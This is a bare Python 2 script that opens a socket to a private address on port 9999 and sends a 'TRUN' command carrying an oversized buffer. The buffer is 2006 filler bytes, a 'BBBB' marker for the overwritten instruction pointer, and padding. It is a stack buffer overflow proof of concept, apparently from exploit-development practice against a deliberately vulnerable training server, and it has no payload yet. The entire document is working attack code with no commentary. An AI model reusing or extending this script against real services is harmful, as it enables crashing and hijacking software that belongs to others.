#!/usr/bin/python
import socket
server = '172.16.121.139'
sport = 9999

#length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

offset = 'A' * 2006
eip = 'BBBB'
maxsize = "C" *(3500- 2006 - 4) # MAXSize - `offset - eip 

#print "Sending attack length ", length, ' to TRUN .'
attack = offset + eip + maxsize

s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()